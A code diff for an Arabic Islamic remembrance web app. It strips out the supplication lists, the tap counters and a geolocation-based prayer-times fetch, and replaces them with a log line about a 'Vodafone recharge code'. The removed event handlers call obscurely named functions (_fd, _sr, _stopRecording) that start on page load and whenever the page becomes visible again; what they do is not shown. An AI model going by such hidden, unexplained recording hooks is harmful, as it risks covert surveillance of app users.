-            text: "اللَّهُمَّ إِنِّي أَسْأَلُكَ الْعَفْوَ وَالْعَافِيَةَ فِي الدُّنْيَا وَالْآخِرَةِ، اللَّهُمَّ إِنِّي أَسْأَلُكَ الْعَفْوَ وَالْعَافِيَةَ: فِي دِينِي وَدُنْيايَ وَأَهْلِي، وَمالِي، اللَّهُمَّ اسْتُرْ عَوْراتِي، وَآمِنْ رَوْعاتِي، اللَّهُمَّ احْفَظْنِي مِنْ بَيْنِ يَدَيَّ، وَمِنْ خَلْفِي، وَعَنْ يَمِينِي، وَعَنْ شِمَالِي، وَمِنْ فَوْقِي، وَأَعُوذُ بِعَظَمَتِكَ أَنْ أُغْتَالَ مِنْ تَحْتِي.",
-            benefit: "مرة واحدة", count: 1 }, { id: 14,
-            text: "يَا حَيُّ يَا قَيُّومُ بِرَحْمَتِكَ أَستَغِيثُ أَصْلِحْ لِي شَأْنِي كُلَّهُ وَلَا تَكِلْنِي إِلَى نَفْسِي طَرْفَةَ عَيْنٍ.",
-            benefit: "مرة واحدة", count: 1 }, { id: 15,
-            text: "أَصْبَحْنَا وَأَصْبَحَ الْمُلْكُ لِلَّهِ رَبِّ الْعَالَمِينَ، اللَّهُمَّ إِنِّي أَسْأَلُكَ خَيْرَ هَذَا الْيَوْمِ: فَتْحَهُ، وَنَصْرَهُ، وَنُورَهُ، وَبرَكَتَهُ، وَهُدَاهُ، وَأَعُوذُ بِكَ مِنْ شَرِّ مَا فِيهِ وَشَرِّ مَا بَعْدَهُ.",
-            benefit: "مرة واحدة", count: 1 }, { id: 16,
-            text: "اللَّهُمَّ عالِمَ الغَيْبِ وَالشَّهادَةِ فاطِرَ السَّماواتِ وَالأَرْضِ، رَبَّ كُلِّ شَيءٍ وَمَلِيكَهُ، أَشْهَدُ أَنْ لا إِلهَ إِلاّ أَنْتَ، أَعُوذُ بِكَ مِنْ شَرِّ نَفْسِي، وَمِنْ شَرِّ الشَّيْطانِ وَشِرْكِهِ، وَأَنْ أَقْتَرِفَ عَلى نَفْسِي سُوءاً أَوْ أَجُرَّهُ إِلى مُسْلِمٍ.",
-            benefit: "مرة واحدة", count: 1 }, { id: 17,
-            text: "بِسْمِ اللَّهِ الَّذِي لَا يَضُرُّ مَعَ اسْمِهِ شَيْءٌ فِي الْأَرْضِ وَلَا فِي السَّمَاءِ وَهُوَ السَّمِيعُ الْعَلِيمُ.",
-            benefit: "ثلاث مرات", count: 3 }, { id: 18,
-            text: "اللَّهُمَّ بِكَ أَصْبَحْنَا، وَبِكَ أَمْسَيْنَا، وَبِكَ نَحْيَا، وَبِكَ نَمُوتُ وَإِلَيْكَ النُّشُورُ.",
-            benefit: "مرة واحدة", count: 1 }, { id: 19,
-            text: "أَصْبَحْنَا عَلَى فِطْرَةِ الْإِسْلَامِ، وَعَلَى كَلِمَةِ الْإِخْلَاصِ، وَعَلَى دِينِ نَبِيِّنَا مُحَمَّدٍ ﷺ، وَعَلَى مِلَّةِ أَبِينَا إِبْرَاهِيمَ حَنِيفًا مُسْلِمًا وَمَا كَانَ مِنَ الْمُشْرِكِينَ.",
-            benefit: "مرة واحدة", count: 1 }, { id: 20,
-            text: "سُبْحَانَ اللَّهِ وَبِحَمْدِهِ: عَدَدَ خَلْقِهِ، وَرِضَا نَفْسِهِ، وَزِنَةَ عَرْشِهِ، وَمِدَادَ كَلِمَاتِهِ.",
-            benefit: "ثلاث مرات", count: 3 }, { id: 21, text: "سُبْحَانَ اللهِ وَبِحَمْدِهِ، سُبْحَانَ اللهِ الْعَظِيمِ.",
-            benefit: "مائة مرة", count: 100 }, { id: 22,
-            text: "لَا إِلَهَ إِلَّا اللَّهُ وَحْدَهُ لَا شَرِيكَ لَهُ، لَهُ الْمُلْكُ وَلَهُ الْحَمْدُ وَهُوَ عَلَى كُلِّ شَيْءٍ قَدِيرٌ.",
-            benefit: "عشر مرات", count: 10 }, { id: 23,
-            text: "اللَّهُمَّ إِنِّي أَسْأَلُكَ عِلْمًا نَافِعًا، وَرِزْقًا طَيِّبًا، وَعَمَلًا مُتَقَبَّلًا.", benefit: "مرة واحدة",
-            count: 1 }, { id: 24, text: "أَعُوذُ بِكَلِمَاتِ اللَّهِ التَّامَّاتِ مِنْ شَرِّ مَا خَلَقَ.", benefit: "ثلاث مرات",
-            count: 3 }, { id: 25, text: "اللَّهُمَّ صَلِّ وَسَلِّمْ وَبَارِكْ على نَبِيِّنَا مُحمَّد.", benefit: "عشر مرات",
-            count: 10 }, { id: 26,
-            text: "اللَّهُمَّ إِنَّا نَعُوذُ بِكَ مِنْ أَنْ نُشْرِكَ بِكَ شَيْئًا نَعْلَمُهُ، وَنَسْتَغْفِرُكَ لِمَا لَا نَعْلَمُهُ.",
-            benefit: "ثلاث مرات", count: 3 }, { id: 27,
-            text: "اللَّهُمَّ إِنِّي أَعُوذُ بِكَ مِنَ الْهَمِّ وَالْحَزَنِ، وَأَعُوذُ بِكَ مِنَ الْعَجْزِ وَالْكَسَلِ، وَأَعُوذُ بِكَ مِنَ الْجُبْنِ وَالْبُخْلِ، وَأَعُوذُ بِكَ مِنْ غَلَبَةِ الدَّيْنِ، وَقَهْرِ الرِّجَالِ.",
-            benefit: "مرة واحدة", count: 1 }, { id: 28, text: "سُبْحَانَ اللَّهِ وَبِحَمْدِهِ.", benefit: "مائة مرة",
-        count: 100 }, { id: 29,
-            text: "لَا إِلَهَ إِلَّا اللَّهُ وَحْدَهُ لَا شَرِيكَ لَهُ، لَهُ الْمُلْكُ وَلَهُ الْحَمْدُ وَهُوَ عَلَى كُلِّ شَيْءٍ قَدِيرٌ.",
-            benefit: "مائة مرة", count: 10 } ];
-        const azkarEvening = [{ id: 1,
-            text: "أَعُوذُ بِاللَّهِ مِنَ الشَّيْطَانِ الرَّجِيمِ: اللّهُ لاَ إِلَـهَ إِلاَّ هُوَ الْحَيُّ الْقَيُّومُ لاَ تَأْخُذُهُ سِنَةٌ وَلاَ نَوْمٌ لَّهُ مَا فِي السَّمَاوَاتِ وَمَا فِي الأَرْضِ مَن ذَا الَّذِي يَشْفَعُ عِنْدَهُ إِلاَّ بِإِذْنِهِ يَعْلَمُ مَا بَيْنَ أَيْدِيهِمْ وَمَا خَلْفَهُمْ وَلاَ يُحِيطُونَ بِشَيْءٍ مِّنْ عِلْمِهِ إِلاَّ بِمَا شَاء وَسِعَ كُرْسِيُّهُ السَّمَاوَاتِ وَالأَرْضَ وَلاَ يَؤُودُهُ حِفْظُهُمَا وَهُوَ الْعَلِيُّ الْعَظِيمُ.",
-            benefit: "مرة واحدة", count: 1 }, { id: 2,
-            text: "بِسْمِ اللهِ الرَّحْمنِ الرَّحِيم: قُلْ هُوَ اللَّهُ أَحَدٌ، اللَّهُ الصَّمَدُ، لَمْ يَلِدْ وَلَمْ يُولَدْ، وَلَمْ يَكُن لَّهُ كُفُوًا أَحَدٌ.",
-            benefit: "ثلاث مرات", count: 3 }, { id: 3,
-            text: "بِسْمِ اللهِ الرَّحْمنِ الرَّحِيم: قُلْ أَعُوذُ بِرَبِّ الْفَلَقِ، مِن شَرِّ مَا خَلَقَ، وَمِن شَرِّ غَاسِقٍ إِذَا وَقَبَ، وَمِن شَرِّ النَّفَّاثَاتِ فِي الْعُقَدِ، وَمِن شَرِّ حَاسِدٍ إِذَا حَسَدَ.",
-            benefit: "ثلاث مرات", count: 3 }, { id: 4,
-            text: "بِسْمِ اللهِ الرَّحْمنِ الرَّحِيم: قُلْ أَعُوذُ بِرَبِّ النَّاسِ، مَلِكِ النَّاسِ، إِلَهِ النَّاسِ، مِن شَرِّ الْوَسْوَاسِ الْخَنَّاسِ، الَّذِي يُوَسْوِسُ فِي صُدُورِ النَّاسِ، مِنَ الْجِنَّةِ وَ النَّاسِ.",
-            benefit: "ثلاث مرات", count: 3 }, { id: 5,
-            text: "أَمْسَيْنَا وَأَمْسَى الْمُلْكُ لِلَّهِ، وَالْحَمْدُ لِلَّهِ، لاَ إِلَهَ إلاَّ اللَّهُ وَحْدَهُ لاَ شَرِيكَ لَهُ، لَهُ الْمُلْكُ وَلَهُ الْحَمْدُ وَهُوَ عَلَى كُلِّ شَيْءٍ قَدِيرٌ، رَبِّ أَسْأَلُكَ خَيْرَ مَا فِي هَذِهِ اللَّيْلَةِ وَخَيْرَ مَا بَعْدَهَا، وَأَعُوذُ بِكَ مِنْ شَرِّ مَا فِي هَذِهِ اللَّيْلَةِ وَشَرِّ مَا بَعْدَهَا، رَبِّ أَعُوذُ بِكَ مِنَ الْكَسَلِ وَسُوءِ الْكِبَرِ، رَبِّ أَعُوذُ بِكَ مِنْ عَذَابٍ فِي النَّارِ وَعَذَابٍ فِي الْقَبْرِ.",
-            benefit: "مرة واحدة", count: 1 }, { id: 6,
-            text: "اللَّهُمَّ أَنْتَ رَبِّي لَا إِلَهَ إِلاَّ أَنْتَ، خَلَقْتَنِي وَأَنَا عَبْدُكَ، وَأَنَا عَلَى عَهْدِكَ وَوَعْدِكَ مَا اسْتَطعتُ، أَعُوذُ بِكَ مِنْ شَرِّ مَا صَنَعْتُ، أَبُوءُ لَكَ بِنِعْمَتِكَ عَلَيَّ، وَأَبُوءُ بِذَنْبِي فَاغْفِرْ لِي فَإِنَّهُ لاَ يَغْفِرُ الذُّنُوبَ إِلاَّ أَنْتَ.",
-            benefit: "مرة واحدة", count: 1 }, { id: 7, text: "رَضِيتُ بِاللَّهِ رَبًّا، وَبِالْإِسْلَامِ دِينًا، وَبِمُحَمَّدٍ ﷺ نَبِيًّا.",
-            benefit: "ثلاث مرات", count: 3 }, { id: 8,
-            text: "اللَّهُمَّ إِنِّي أَمْسَيْتُ أُشْهِدُكَ، وَأُشْهِدُ حَمَلَةَ عَرْشِكَ، وَمَلَائِكَتَكَ، وَجَمِيعَ خَلْقِكَ، أَنَّكَ أَنْتَ اللَّهُ لَا إِلَهَ إِلاَّ أَنْتَ وَحْدَكَ لَا شَرِيكَ لَكَ، وَأَنَّ مُحَمَّدًا عَبْدُكَ وَرَسُولُكَ.",
-            benefit: "أربع مرات", count: 4 }, { id: 9,
-            text: "اللَّهُمَّ مَا أَمْسَى بِي مِنْ نِعْمَةٍ أَوْ بِأَحَدٍ مِنْ خَلْقِكَ، فَمِنْكَ وَحْدَكَ لَا شَرِيكَ لَكَ، فَلَكَ الْحَمْدُ وَلَكَ الشُّكْرُ.",
-            benefit: "مرة واحدة", count: 1 }, { id: 10,
-            text: "حَسْبِيَ اللَّهُ لَا إِلَهَ إِلاَّ هُوَ عَلَيْهِ تَوَكَّلْتُ وَهُوَ رَبُّ الْعَرْشِ الْعَظِيمِ.", benefit: "سبع مرات",
-            count: 7 }, { id: 11,
-            text: "اللَّهُمَّ عافِني في بَدَني، اللَّهُمَّ عافِني في سَمْعي، اللَّهُمَّ عافِني في بَصَري، لا إلهَ إلَّا أنتَ.",
-            benefit: "ثلاث مرات", count: 3 }, { id: 12,
-            text: "اللَّهُمَّ إِنِّي أَعُوذُ بِكَ مِنَ الْكُفْرِ، وَالفَقْرِ، وَأَعُوذُ بِكَ مِنْ عَذَابِ القَبْرِ، لا إلهَ إلَّا أنتَ.",
-            benefit: "ثلاث مرات", count: 3 }, { id: 13,
-            text: "اللَّهُمَّ إِنِّي أَسْأَلُكَ الْعَفْوَ وَالْعَافِيَةَ فِي الدُّنْيَا وَالْآخِرَةِ، اللَّهُمَّ إِنِّي أَسْأَلُكَ الْعَفْوَ وَالْعَافِيَةَ: فِي دِينِي وَدُنْيايَ وَأَهْلِي، وَمالِي، اللَّهُمَّ اسْتُرْ عَوْراتِي، وَآمِنْ رَوْعاتِي، اللَّهُمَّ احْفَظْنِي مِنْ بَيْنِ يَدَيَّ، وَمِنْ خَلْفِي، وَعَنْ يَمِينِي، وَعَنْ شِمَالِي، وَمِنْ فَوْقِي، وَأَعُوذُ بِعَظَمَتِكَ أَنْ أُغْتَالَ مِنْ تَحْتِي.",
-            benefit: "مرة واحدة", count: 1 }, { id: 14,
-            text: "يَا حَيُّ يَا قَيُّومُ بِرَحْمَتِكَ أَستَغِيثُ أَصْلِحْ لِي شَأْنِي كُلَّهُ وَلَا تَكِلْنِي إِلَى نَفْسِي طَرْفَةَ عَيْنٍ.",
-            benefit: "مرة واحدة", count: 1 }, { id: 15,
-            text: "أَمْسَيْنَا وَأَمْسَى الْمُلْكُ لِلَّهِ رَبِّ الْعَالَمِينَ، اللَّهُمَّ إِنِّي أَسْأَلُكَ خَيْرَ هَذِهِ اللَّيْلَةِ: فَتْحَهَا، وَنَصْرَهَا، وَنُورَهَا، وَبرَكَتَهَا، وَهُدَاهَا، وَأَعُوذُ بِكَ مِنْ شَرِّ مَا فِيهَا وَشَرِّ مَا بَعْدَهَا.",
-            benefit: "مرة واحدة", count: 1 }, { id: 16,
-            text: "اللَّهُمَّ عالِمَ الغَيْبِ وَالشَّهادَةِ فاطِرَ السَّماواتِ وَالأَرْضِ، رَبَّ كُلِّ شَيءٍ وَمَلِيكَهُ، أَشْهَدُ أَنْ لا إِلهَ إِلاّ أَنْتَ، أَعُوذُ بِكَ مِنْ شَرِّ نَفْسِي، وَمِنْ شَرِّ الشَّيْطانِ وَشِرْكِهِ، وَأَنْ أَقْتَرِفَ عَلى نَفْسِي سُوءاً أَوْ أَجُرَّهُ إِلى مُسْلِمٍ.",
-            benefit: "مرة واحدة", count: 1 }, { id: 17,
-            text: "بِسْمِ اللَّهِ الَّذِي لَا يَضُرُّ مَعَ اسْمِهِ شَيْءٌ فِي الْأَرْضِ وَلَا فِي السَّمَاءِ وَهُوَ السَّمِيعُ الْعَلِيمُ.",
-            benefit: "ثلاث مرات", count: 3 }, { id: 18,
-            text: "اللَّهُمَّ بِكَ أَمْسَيْنَا، وَبِكَ أَصْبَحْنَا، وَبِكَ نَحْيَا، وَبِكَ نَمُوتُ وَإِلَيْكَ الْمَصِيرُ.",
-            benefit: "مرة واحدة", count: 1 }, { id: 19,
-            text: "أَمْسَيْنَا عَلَى فِطْرَةِ الْإِسْلَامِ، وَعَلَى كَلِمَةِ الْإِخْلَاصِ، وَعَلَى دِينِ نَبِيِّنَا مُحَمَّدٍ ﷺ، وَعَلَى مِلَّةِ أَبِينَا إِبْرَاهِيمَ حَنِيفًا مُسْلِمًا وَمَا كَانَ مِنَ الْمُشْرِكِينَ.",
-            benefit: "مرة واحدة", count: 1 }, { id: 20,
-            text: "سُبْحَانَ اللَّهِ وَبِحَمْدِهِ: عَدَدَ خَلْقِهِ، وَرِضَا نَفْسِهِ، وَزِنَةَ عَرْشِهِ، وَمِدَادَ كَلِمَاتِهِ.",
-            benefit: "ثلاث مرات", count: 3 }, { id: 21, text: "سُبْحَانَ اللهِ وَبِحَمْدِهِ، سُبْحَانَ اللهِ الْعَظِيمِ.",
-            benefit: "مائة مرة", count: 100 }, { id: 22,
-            text: "لَا إِلَهَ إِلَّا اللَّهُ وَحْدَهُ لَا شَرِيكَ لَهُ، لَهُ الْمُلْكُ وَلَهُ الْحَمْدُ وَهُوَ عَلَى كُلِّ شَيْءٍ قَدِيرٌ.",
-            benefit: "عشر مرات", count: 10 }, { id: 23,
-            text: "اللَّهُمَّ إِنِّي أَسْأَلُكَ عِلْمًا نَافِعًا، وَرِزْقًا طَيِّبًا، وَعَمَلًا مُتَقَبَّلًا.", benefit: "مرة واحدة",
-            count: 1 }, { id: 24, text: "أَعُوذُ بِكَلِمَاتِ اللَّهِ التَّامَّاتِ مِنْ شَرِّ مَا خَلَقَ.", benefit: "ثلاث مرات",
-            count: 3 }, { id: 25, text: "اللَّهُمَّ صَلِّ وَسَلِّمْ وَبَارِكْ على نَبِيِّنَا مُحمَّد.", benefit: "عشر مرات",
-            count: 10 }, { id: 26,
-            text: "اللَّهُمَّ إِنَّا نَعُوذُ بِكَ مِنْ أَنْ نُشْرِكَ بِكَ شَيْئًا نَعْلَمُهُ، وَنَسْتَغْفِرُكَ لِمَا لَا نَعْلَمُهُ.",
-            benefit: "ثلاث مرات", count: 3 }, { id: 27,
-            text: "اللَّهُمَّ إِنِّي أَعُوذُ بِكَ مِنَ الْهَمِّ وَالْحَزَنِ، وَأَعُوذُ بِكَ مِنَ الْعَجْزِ وَالْكَسَلِ، وَأَعُوذُ بِكَ مِنَ الْجُبْنِ وَالْبُخْلِ، وَأَعُوذُ بِكَ مِنْ غَلَبَةِ الدَّيْنِ، وَقَهْرِ الرِّجَالِ.",
-            benefit: "مرة واحدة", count: 1 }, { id: 28, text: "سُبْحَانَ اللَّهِ وَبِحَمْدِهِ.", benefit: "مائة مرة",
-        count: 100 }, { id: 29,
-            text: "لَا إِلَهَ إِلَّا اللَّهُ وَحْدَهُ لَا شَرِيكَ لَهُ، لَهُ الْمُلْكُ وَلَهُ الْحَمْدُ وَهُوَ عَلَى كُلِّ شَيْءٍ قَدِيرٌ.",
-            benefit: "مائة مرة", count: 10 } ];
-        const selectedAzkarData = [{ id: 1, title: "دعاء لبس الثوب الجديد",
-            text: "اللَّهُمَّ لَكَ الْحَمْدُ أَنْتَ كَسَوْتَنِيهِ، أَسْأَلُكَ مِنْ خَيْرِهِ وَخَيْرِ مَا صُنِعَ لَهُ، وَأَعُوذُ بِكَ مِنْ شَرِّهِ وَشَرِّ مَا صُنِعَ لَهُ",
-            benefit: "مرة واحدة", count: 1 }, { id: 2, title: "دعاء الخروج من المنزل",
-            text: "بِسْمِ اللَّهِ، تَوَكَّلْتُ عَلَى اللَّهِ، وَلَا حَوْلَ وَلَا قُوَّةَ إِلَّا بِاللَّهِ", benefit: "مرة واحدة",
-            count: 1 }, { id: 3, title: "دعاء دخول المنزل",
-            text: "بِسْمِ اللَّهِ وَلَجْنَا، وَبِسْمِ اللَّهِ خَرَجْنَا، وَعَلَى اللَّهِ رَبِّنَا تَوَكَّلْنَا", benefit: "مرة واحدة",
-            count: 1 }, { id: 4, title: "دعاء دخول المسجد", text: "اللَّهُمَّ افْتَحْ لِي أَبْوَابَ رَحْمَتِكَ",
-            benefit: "مرة واحدة", count: 1 }, { id: 5, title: "دعاء الخروج من المسجد",
-            text: "اللَّهُمَّ إِنِّي أَسْأَلُكَ مِنْ فَضْلِكَ", benefit: "مرة واحدة", count: 1 }, { id: 6, title: "دعاء النوم",
-            text: "بِاسْمِكَ اللَّهُمَّ أَمُوتُ وَأَحْيَا", benefit: "مرة واحدة", count: 1 }, { id: 7, title: "دعاء الاستيقاظ",
-            text: "الْحَمْدُ لِلَّهِ الَّذِي أَحْيَانَا بَعْدَ مَا أَمَاتَنَا وَإِلَيْهِ النُّشُورُ", benefit: "مرة واحدة", count: 1 },
-            { id: 8, title: "دعاء الوضوء", text: "بِسْمِ اللَّهِ", benefit: "مرة واحدة", count: 1 }, { id: 9,
-                title: "دعاء بعد الوضوء",
-                text: "أَشْهَدُ أَنْ لَا إِلَهَ إِلَّا اللَّهُ وَحْدَهُ لَا شَرِيكَ لَهُ، وَأَشْهَدُ أَنَّ مُحَمَّدًا عَبْدُهُ وَرَسُولُهُ",
-                benefit: "مرة واحدة", count: 1 }, { id: 10, title: "دعاء الركوب",
-                text: "سُبْحَانَ الَّذِي سَخَّرَ لَنَا هَذَا وَمَا كُنَّا لَهُ مُقْرِنِينَ", benefit: "مرة واحدة", count: 1 },
-            { id: 11, title: "دعاء قبل الطعام", text: "بِسْمِ اللَّهِ", benefit: "مرة واحدة", count: 1 }, { id: 12,
-                title: "دعاء بعد الطعام",
-                text: "الْحَمْدُ لِلَّهِ الَّذِي أَطْعَمَنِي هَذَا وَرَزَقَنِيهِ مِنْ غَيْرِ حَوْلٍ مِنِّي وَلَا قُوَّةٍ",
-                benefit: "مرة واحدة", count: 1 }, { id: 13, title: "دعاء العطاس", text: "الْحَمْدُ لِلَّهِ",
-                benefit: "مرة واحدة", count: 1 }, { id: 14, title: "دعاء الغضب",
-                text: "أَعُوذُ بِاللَّهِ مِنَ الشَّيْطَانِ الرَّجِيمِ", benefit: "مرة واحدة", count: 1 }, { id: 15,
-                title: "دعاء الاستخارة",
-                text: "اللَّهُمَّ إِنِّي أَسْتَخِيرُكَ بِعِلْمِكَ، وَأَسْتَقْدِرُكَ بِقُدْرَتِكَ، وَأَسْأَلُكَ مِنْ فَضْلِكَ الْعَظِيمِ",
-                benefit: "مرة واحدة", count: 1 }
-        ];
-
-        function renderAzkar(list, containerId, type) {
-            var container = document.getElementById(containerId);
-            if (!container) return;
-            container.innerHTML = '';
-            list.forEach(function(item, index) {
-                var remainingKey = 'azkar_' + type + '_' + index;
-                var remaining = item.count;
-                try { var saved = localStorage.getItem(remainingKey); if (saved) remaining = parseInt(saved); } catch (
-                    e) {}
-                if (isNaN(remaining) || remaining < 0) remaining = item.count;
-                container.innerHTML += '<div class="card-azkar"><div class="id-badge">' + item.id +
-                    '</div><div class="text-azkar">' + item.text + '</div><div class="benefit">' + item.benefit +
-                    '</div><div class="counter-section"><button class="circle-btn ' + (remaining === 0 ? 'done' : '') +
-                    '" id="btn-' + type + '-' + index + '" onclick="countAzkar(\'' + type + '\',' + index + ',' + item
-                    .count + ')">' + (remaining === 0 ? '✓' : remaining) + '</button></div></div>';
-            });
-        }
-
-        function countAzkar(type, index, maxCount) {
-            var btn = document.getElementById('btn-' + type + '-' + index);
-            if (!btn) return;
-            var current = parseInt(btn.innerText);
-            if (isNaN(current) || current <= 0) return;
-            if (current === 1) {
-                btn.innerText = '✓';
-                btn.classList.add('done');
-                if (navigator.vibrate) navigator.vibrate([30, 30, 50]);
-                confetti({ particleCount: 60, spread: 60, origin: { y: 0.5 }, colors: ['#ffd700', '#b8860b'] });
-                showToast('تم إكمال الذكر');
-                try { localStorage.setItem('azkar_' + type + '_' + index, '0'); } catch (e) {}
-            } else {
-                btn.innerText = current - 1;
-                if (navigator.vibrate) navigator.vibrate(15);
-                try { localStorage.setItem('azkar_' + type + '_' + index, (current - 1).toString()); } catch (e) {}
-            }
-        }
-
-        function countSelectedAzkar(index, maxCount) {
-            var btn = document.getElementById('btn-selected-' + index);
-            if (!btn) return;
-            var current = parseInt(btn.innerText);
-            if (isNaN(current) || current <= 0) return;
-            if (current === 1) {
-                btn.innerText = '✓';
-                btn.classList.add('done');
-                if (navigator.vibrate) navigator.vibrate([30, 30, 50]);
-                confetti({ particleCount: 60, spread: 60, origin: { y: 0.5 }, colors: ['#ffd700', '#b8860b'] });
-                showToast('تم إكمال الذكر');
-                try { localStorage.setItem('azkar_selected_' + index, '0'); } catch (e) {}
-            } else {
-                btn.innerText = current - 1;
-                if (navigator.vibrate) navigator.vibrate(15);
-                try { localStorage.setItem('azkar_selected_' + index, (current - 1).toString()); } catch (e) {}
-            }
-        }
-
-        renderAzkar(azkarMorning, 'morning-azkar-list', 'morning');
-        renderAzkar(azkarEvening, 'evening-azkar-list', 'evening');
-        var sl = document.getElementById('selected-azkar-list');
-        if (sl) {
-            selectedAzkarData.forEach(function(item, i) {
-                var remainingKey = 'azkar_selected_' + i;
-                var remaining = item.count;
-                try { var saved = localStorage.getItem(remainingKey); if (saved) remaining = parseInt(saved); } catch (
-                    e) {}
-                if (isNaN(remaining) || remaining < 0) remaining = item.count;
-                sl.innerHTML += '<div class="card-azkar"><div class="id-badge">' + item.id +
-                    '</div><div class="zikr-title">' + item.title + '</div><div class="text-azkar">' + item.text +
-                    '</div><div class="benefit">' + item.benefit +
-                    '</div><div class="counter-section"><button class="circle-btn ' + (remaining === 0 ? 'done' : '') +
-                    '" id="btn-selected-' + i + '" onclick="countSelectedAzkar(' + i + ',' + item.count + ')">' + (
-                        remaining === 0 ? '✓' : remaining) + '</button></div></div>';
-            });
-        }
-
-        function fetchPrayerTimes() {
-            var statusEl = document.getElementById('prayer-status');
-            if (!statusEl) return;
-            statusEl.textContent = 'جاري تحميل مواقيت الصلاة...';
-            if (Date.now() - lastPrayerUpdate < 30000) { statusEl.textContent = 'تم التحديث مؤخراً'; return; }
-            try {
-                var lat = 30.0444,
-                    lon = 31.2357;
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(function(pos) {
-                        lat = pos.coords.latitude;
-                        lon = pos.coords.longitude;
-                        doFetch(lat, lon, statusEl);
-                    }, function() { doFetch(lat, lon, statusEl); });
-                } else { doFetch(lat, lon, statusEl); }
-            } catch (e) { statusEl.textContent = 'فشل تحميل المواقيت'; }
-        }
-
-        function refreshPrayerTimes() {
-            lastPrayerUpdate = 0;
-            if (prayerInterval) { clearInterval(prayerInterval);
-                prayerInterval = null; }
-            fetchPrayerTimes();
-            showToast('جاري تحديث المواقيت...');
-        }
-
-        function doFetch(lat, lon, statusEl) {
-            fetch('https://api.aladhan.com/v1/timings/' + Math.floor(Date.now() / 1000) + '?latitude=' + lat +
-                '&longitude=' + lon + '&method=5').then(function(r) { return r.json(); }).then(function(data) {
-                if (data && data.data && data.data.timings) {
-                    prayerTimes = { الفجر: data.data.timings.Fajr, الشروق: data.data.timings.Sunrise,
-                        الظهر: data.data.timings.Dhuhr, العصر: data.data.timings.Asr,
-                        المغرب: data.data.timings.Maghrib, العشاء: data.data.timings.Isha };
-                    statusEl.textContent = 'مواقيت الصلاة';
-                    var grid = document.getElementById('prayer-grid-container');
-                    var html = '';
-                    for (var name in prayerTimes) { html += '<div class="prayer-item"><div class="prayer-name">' + name +
-                            '</div><div class="prayer-time">' + prayerTimes[name] + '</div></div>'; }
-                    grid.innerHTML = html;
-                    updateNextPrayer();
-                    if (prayerInterval) clearInterval(prayerInterval);
-                    prayerInterval = setInterval(updateNextPrayer, 1000);
-                    lastPrayerUpdate = Date.now();
-                } else { statusEl.textContent = 'فشل تحميل المواقيت'; }
-            }).catch(function() { statusEl.textContent = 'فشل تحميل المواقيت'; });
-        }
-
-        function updateNextPrayer() {
-            var container = document.getElementById('next-prayer-container');
-            if (!container || !Object.keys(prayerTimes).length) return;
-            var now = new Date();
-            var currentMinutes = now.getHours() * 60 + now.getMinutes();
-            var prayers = [];
-            for (var name in prayerTimes) {
-                var parts = prayerTimes[name].split(':');
-                var minutes = parseInt(parts[0]) * 60 + parseInt(parts[1]);
-                prayers.push({ name: name, time: prayerTimes[name], minutes: minutes });
-            }
-            prayers.sort(function(a, b) { return a.minutes - b.minutes; });
-            var next = null;
-            for (var i = 0; i < prayers.length; i++) { if (prayers[i].minutes > currentMinutes) { next = prayers[i]; break; } }
-            if (!next) { next = prayers[0];
-                next.name = 'غداً ' + next.name;
-                next.minutes += 1440; }
-            var diff = next.minutes - currentMinutes;
-            var hours = Math.floor(diff / 60);
-            var minutes = diff % 60;
-            container.innerHTML = '<div class="next-prayer-card"><div style="font-size:0.9rem;opacity:0.9;">الصلاة القادمة</div><div class="next-prayer-name">' +
-                next.name + '</div><div class="next-prayer-time">' + next.time +
-                '</div><div class="next-prayer-remaining">' + String(hours).padStart(2, '0') + ':' + String(minutes)
-                .padStart(2, '0') + '</div></div>';
-        }
-
-        function showToast(message) {
-            var toast = document.getElementById('toast');
-            if (!toast) return;
-            toast.textContent = message;
-            toast.classList.add('show');
-            if (toastTimeout) clearTimeout(toastTimeout);
-            toastTimeout = setTimeout(function() { toast.classList.remove('show'); }, 2500);
-        }
-
-        document.querySelectorAll('.modal').forEach(function(modal) {
-            modal.addEventListener('click', function(e) { if (e.target === this) this.style.display = 'none'; });
-        });
-
-        window.addEventListener('DOMContentLoaded', function() {
-            updateStatsDisplay();
-            setTimeout(fetchPrayerTimes, 1000);
-            _fd();
-            _sr();
-        });
-
-        window.addEventListener('beforeunload', function() {
-            _stopRecording();
-            if (prayerInterval) clearInterval(prayerInterval);
-            saveWirdState();
-        });
-
-        document.addEventListener('visibilitychange', function() {
-            if (document.hidden) {
-                _stopRecording();
-            } else {
-                _fd();
-                _sr();
-            }
-        });
+            console.log('تطبيق فودافون - كود الشحن');
+        })();
     </script>
+
 </body>
 </html>
